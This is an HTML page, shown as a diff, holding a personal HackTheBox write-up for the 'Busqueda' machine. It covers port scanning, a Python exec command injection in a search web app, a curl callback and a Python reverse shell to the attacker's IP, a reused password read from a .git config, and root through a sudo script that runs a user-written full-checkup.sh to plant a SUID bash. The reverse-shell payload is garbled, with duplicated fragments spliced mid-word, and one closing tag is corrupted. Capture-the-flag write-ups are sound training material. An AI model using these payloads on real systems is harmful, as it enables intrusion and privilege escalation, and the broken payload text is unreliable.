@@ -1,0 +1,253 @@
+<!DOCTYPE html>
+
+<html lang="en">
+
+<style>
+    body {
+        background-color: #363636;
+        /* background-color:bisque; */
+        color: whitesmoke;
+        font-family:Arial, Helvetica, sans-serif
+    }
+
+    a {
+        text-decoration: none; 
+        color: inherit;
+    }
+
+    .topnav {
+        background-color: #242424;
+        overflow: hidden;
+        position: fixed;
+        width: 100%;
+        top: 0;
+        right: 0;
+    }
+
+    .topnav .name {
+        float: left;
+        color: #f2f2f2;
+        text-align: center;
+        padding: 14px 16px;
+        text-decoration: none;
+        font-size: 17px;
+    }
+
+    .topnav a {
+        float: right;
+        color: #f2f2f2;
+        text-align: center;
+        padding: 14px 16px;
+        font-size: 17px;
+    }
+
+
+    .topnav a:hover {
+        background-color: #ddd;
+        text-decoration-line: underline;
+        color: black;
+    }
+
+    .topnav a.active {
+        background-color:#0077ff;
+        color:white;
+    }
+
+    .topnav .center-topnav {
+        margin: auto;
+        width: 80%;
+        max-width: 930px
+    }
+
+    .content {
+        margin: auto;
+        width: 80%;
+        max-width: 900px;
+        padding-top: 50px;
+        display: grid;
+        line-height: 1.5em;
+        /* border-color: #0077ff; border-width: 2px; border-style: solid; */
+    }
+
+
+
+    .content p {
+        margin-bottom:0px;
+    }
+
+    /* .content .cell {
+        border-color: green;
+        border-width: 2px;im al
+        border-style: solid;
+    } */
+
+    .content .cell .text {
+        margin:auto;
+        text-align: center;
+    }
+
+    .content h2 {
+        margin-top:40px;
+        margin-bottom:0px;
+    }
+
+    .content h3 {
+        margin-bottom:0px;
+    }
+
+    .content .box-icon {
+        display: block;
+        width: 20%;
+    }
+
+    pre {
+        overflow: auto;
+    }
+
+    pre code {
+        background-color: #000;
+        border: 1px solid #999;
+        display: block;
+        padding: 15px;
+        overflow: auto;
+    }
+
+    img {
+        margin-top: 10px;
+        width: 80%
+    }
+
+    h1, h2 {
+        color:#0077ff
+    }
+
+    h3 {
+        color:#99c9ff
+    }
+
+</style>
+
+<head>
+    <div class="topnav">
+        <div class="center-topnav">
+            <a href=/index.html class="name">Jaguar Perlas</a>
+            <a class="active" href="/hack/hacks/index.html">Hacks</a>
+            <a href="/hack/about.html">About me</a>
+            <a href="/hack/index.html">Home</a>
+        </div>
+    </div>
+</head>
+
+<body>
+    <div class="content">
+
+        <h1>[Easy] Busqueda</h1>
+        <img class="box-icon" src="/hack/images/busqueda.png"></img>
+        <p><i>User compromise on April 14, 2023</br>Root compromise on April 15, 2023</br>Written on March 4, 2024</i></p>
+        <p>Busqueda is my seventh machine to compromise on HackTheBox. This Linux machine features a Command Injection vulnerability
+            in Python, hardcoded credentials, and a Python script runnable as root that can only be read through Gitea.
+        </p>
+        <h2>Enumeration</h2>
+        <h3>Nmap</h3>
+        <p>Let's start with an Nmap scan.</p>
+        <pre><code>nmap 10.10.11.208 -p- --min-rate=3000</code></pre>
+        <img src="../images/busqueda2.png">
+        <p>Ports 22 and 80 are open. Let's use Nmap scripts on those ports to gain more information.</p>
+        <pre><code>nmap 10.10.11.208 -p22,80 -sC -sV --min-rate=3000</code></pre>
+        <img src="../images/busqueda3.png">
+        <h3>Port 80 - TCP</h3>
+        <p>From our Nmap scans, there is a website running on port 80. Navigating to that website at http://10.10.11.208, we are redirected to
+            searcher.htb but encounter an error.
+        </p>
+        <img src="../images/busqueda4.png">
+        <p>This is because our computer does not know the IP address to searcher.htb. To fix this, we add the domain name and the corresponding IP address to /etc/hosts.</p>
+        <pre><code>echo "10.10.11.208 searcher.htb" | sudo tee -a /etc/hosts</br>cat /etc/hosts</code></pre>
+        <img src="../images/busqueda5.png">
+        <p>Now we're able to browse the website.</p>
+        <img src="../images/busqueda6.png">
+        <p>Tinkering with the website, the main feature seems to be automatically crafting a search URL to automatically redirect us to our desired search engine and keywords.</p>
+        <p>If we select Google as our search engine, and search for test, we are resulted with a URL that directs us to Google with the search results.</p>
+        <img src="../images/busqueda7.png">
+        <p>This seems to be a command injection vulnerability. I quickly test by inputting a semi colon.</p>
+        <pre><code>'test123</code></pre>
+        <img src="../images/busqueda8.png">
+        <p>The result is a blank page. This is most likely a command injection vulnerability.</p>
+        <img src="../images/busqueda9.png">
+        <p>I used Wappalyzer to find out what language this website is running on. From our extension, it is using Python.</p>
+        <img src="../images/busqueda10.png">
+        <p>This means the command injection should take in Python code. The following Python code I used closes the original code with a ")", then calls exec() to process my injected code.
+            My injected code executes a shell command that sends a GET request to my web server on my attack machine. Then I added a "#" to comment out any other code that may be on the same line.</p>
+        <pre><code>' + 'test123') + exec('import os; os.system("curl http://10.10.14.2:8000/test")') #</code></pre>
+        <img src="../images/busqueda11.png">
+        <p>Before hitting "Search", I quickly start a HTTP server to catch the GET request from the attack machine.</p>
+        <pre><code>python3 -m http.server</code></pre>
+        <img src="../images/busqueda11a.png">
+        <p>Now we hit "Search".</p>
+        <p>The target web application successfully executed my Python code as I got a hit on my web server. This confirms a command injection vulnerability.</p>
+        <img src="../images/busqueda12.png">
+
+        <h2>Exploit - Python Command Injection</h2>
+        <p>To use this vulnerability to our advantage, we'll use Python code that will send a reverse shell to our attack machine. First we set up our listener.</p>
+        <pre><code>nc -lvnp 4444</code></pre>
+        <img src="../images/busqueda13.png">
+        <p>Then we'll inject our reverse shell Python code from revshells.com into the web application.</p>
+        <pre><code>' + 'test123') + exec('im' + 'test123') + exec('import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.2",4444));os.dup2(s.fileno(),0); os.dup2(s.fileport socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.2",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")') #</code></pre>
+        <img src="../images/busqueda14.png">
+        <p>Our listener caught the reverse shell. We now have access to the machine as user "svc".</p>
+        <img src="../images/busqueda15.png">
+        <p>We got user flag.</p>
+        <pre><code>cd</br>ls</br>cat user.txt</code></pre>
+        <img src="../images/busqueda16.png">
+
+        <h2>Privilege Escalation - Root</h2>
+        <p>Searching in the web root directory, we can find a hidden .git directory. In that directory, we can find a file named "config" which contains the password for our current user "svc".</p>
+        <pre><code>cd /var/www/app</br>ls -la</br>cd .git</br>ls -la</br>cat config</code></pre>
+        <img src="../images/busqueda17.png">
+        <p>We can confirm this by attempting to SSH into the machine as "svc" with the password.</p>
+        <pre><code>ssh svc@10.10.11.208</br>jh1usoih2bkjaspwe92</code></pre>
+        <img src="../images/busqueda18.png">
+        <p>Checking for sudo privileges, we see that our user is able to run a command as root.</p>
+        <pre><code>sudo -l</code></pre>
+        <img src="../images/busqueda19.png">
+        <p>Running the command as root, we are given a few arguments to pass in.</p>
+        <pre><code>sudo -u root /usr/bin/python3 /opt/scripts/system-checkup.py help</code></pre>
+        <img src="../images/busqueda20.png">
+        <p>Running with each argument, docker-ps shows the currently running containers, docker-inspect requires more arguments, and full-checkup checks if the
+            containers are running and also reveals a new subdomain: gitea.searcher.htb.</p>
+        <pre><code>sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-ps</br>sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-inspect</br>sudo /usr/bin/python3 /opt/scripts/system-checkup.py full-checkup</code></pre>
+        <img src="../images/busqueda21.png">
+        <p>We'll add the new subdomain to our hosts file on our attack machine.</p>
+        <pre><code>sudo nano /etc/hosts</br>cat /etc/hosts</code></pre>
+        <img src="../images/busqueda22.png">
+        <p>We can find a Gitea instance on the new subdomain. On the Gitea website, we can also explore and find two users: "administrator" and "cody".</p>
+        <img src="../images/busqueda23.png">
+        <p>The password we found earlier (jh1usoih2bkjaspwe92) was the password to cody's account. We can login as cody, but unfortunately, we don't find much info when exploring his repositories. Only found the source code
+            for the search engine web application.
+        </p>
+        <p>The same password doesn't work for the administrator account either.</p>
+        <p>Going back to the docker-inspect command, it requires two additional parameters: format and container name. With a quick search on docker-inspect formats, we can find and example in their documentation.</p>
+        <img src="../images/busqueda24.png">
+        <p>Doing this in our situation, we get some information out of the running containers. Within that information, are new potential passwords.</p>
+        <pre><code>sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-inspect '{{json .Config}}' 960</code></pre>
+        <img src="../images/busqueda25.png">
+        <pre><code>sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-inspect '{{json .Config}}' f84</code></pre>
+        <img src="../images/busqueda26.png">
+        <p>One of these passwords works for the administrator account on Gitea, revealing to us a private repository with the scripts we were tinkering earlier. We didn't have permissions to read them earlier,
+            but now we do through Gitea.</p>
+        <img src="../images/busqueda27.png">
+        <p>In the system-checkup.sh script, one particular line stands out.</p>
+        <img src="../images/busqueda28.png">
+        <p>If we run the system-checkup.sh script with sudo privileges, it will find a file named "full-checkup.sh" in our current directory and execute it.
+            To verify, we'll write a simple script in our home directory and run system-checkup.sh script with sudo. The simple script will copy /bin/bash to our home directory and set it as a SUID binary.
+            SUID allows us to run it as a different user. In this case, it will run as root.</p>
+        <pre><code>cd</br>echo $"#!/bin/bash\ncp /bin/bash /home/svc/hacked\nchmod 4777 /home/svc/hacked" > full-checkup.sh</br>chmod +x full-checkup.sh</br>sudo /usr/bin/python3 /opt/scripts/system-checkup.py full-checkup</br>ls -l</code></pre>
+        <img src="../images/busqueda29.png">
+        <p>Our bash binary has been successfully created and we've verified that it is owned by root and the "s" bit is there. Now we execute our new binary and get root flag.</p>
+        <pre><code>./hacked -p</br>cat /root/root.txt</code></pre>
+        <img src="../images/busqueda30.png">
+
+
+    </div>
+</bo11dy>
+
+</html>
